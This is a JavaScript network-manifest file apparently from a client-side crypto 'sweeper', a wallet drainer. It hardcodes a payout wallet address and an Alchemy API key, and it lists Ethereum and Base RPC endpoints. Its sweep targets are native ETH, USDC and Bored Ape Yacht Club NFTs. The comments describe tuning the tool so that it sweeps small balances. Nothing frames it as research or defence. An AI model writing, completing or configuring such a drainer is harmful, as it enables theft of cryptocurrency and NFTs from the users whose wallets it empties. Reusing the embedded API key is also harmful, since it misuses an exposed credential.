// client-side-evm-sweeper/src/config/network-manifest.js

/**
 * NETWORK MANIFEST - Hardened Multi-Chain Configuration (v8)
 * Fully compatible with top-level MasterLink and TransactionRunner parameters.
 */
export const networkManifest = {
    // FIXED 1: Moved parameter assignments to the root namespace to match MasterLink specifications exactly
    EVM_PAYOUT_TARGET: "0xf084c0c620c24d2a8c02f5630fb1aa7e0a9210e9",
    ALCHEMY_API_KEY: "Khs7bqnVFaoeltrODf4Bx", 

    networks: [
        {
            chainId: 1,
            name: "Ethereum",
            rpcUrls: [
                "https://rpc.ankr.com/eth",
                "https://eth.llamarpc.com",
                "https://1rpc.io/eth"
            ],
            multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
            explorer: "https://etherscan.io",
            nativeCurrency: "ETH",
            maxGasMultiplier: 1.3,
        },
        {
            chainId: 8453,
            name: "Base",
            rpcUrls: [
                "https://mainnet.base.org",
                "https://rpc.ankr.com/base",
                "https://base.llamarpc.com"
            ],
            multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
            explorer: "https://basescan.org",
            nativeCurrency: "ETH",
            maxGasMultiplier: 1.4,
        }
    ],

    // TARGET ASSETS TO SCAN / SWEEP
    targets: [
        // FIXED 2: Added explicit Base Native ETH target block to trigger the $1.85 loop
        {
            id: "base-native-eth",
            chainId: 8453, // Targets the Base Network explicitly
            type: "wallet", // Informs multi-scanner.js to utilize provider.getBalance
            address: "0x0000000000000000000000000000000000000000", // Standard Native Coin dummy placeholder mapping
            metadata: { 
                symbol: "ETH", 
                nativeToken: "ETH",
                label: "Base Native Gas Coins" 
            }
        },
        {
            id: "usdc-eth",
            chainId: 1,
            type: "erc20",
            address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            metadata: { symbol: "USDC", label: "USD Coin" }
        },
        {
            id: "bayc",
            chainId: 1,
            type: "erc721",
            address: "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d",
            metadata: { symbol: "BAYC", label: "Bored Ape Yacht Club" }
        }
    ]
};

export function validateManifest() {
    const { EVM_PAYOUT_TARGET, networks, targets } = networkManifest;
    
    if (!EVM_PAYOUT_TARGET || EVM_PAYOUT_TARGET === "0x0000000000000000000000000000000000000000") {
        console.warn("⚠️ WARNING: Default payout target is missing or set to zero address!");
    }
    if (!networks || networks.length === 0) {
        throw new Error("No networks defined in networkManifest");
    }
    if (!targets || targets.length === 0) {
        console.warn("⚠️ No targets defined in networkManifest");
    }
    if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_PAYOUT_TARGET)) {
        throw new Error(`Invalid Ethereum address in payout configuration: ${EVM_PAYOUT_TARGET}`);
    }
    console.log(`✅ Network manifest validated | ${networks.length} networks | ${targets.length} targets`);
}

if (typeof process !== 'undefined' && process.env.NODE_ENV !== 'production') {
    validateManifest();
}

export default networkManifest;
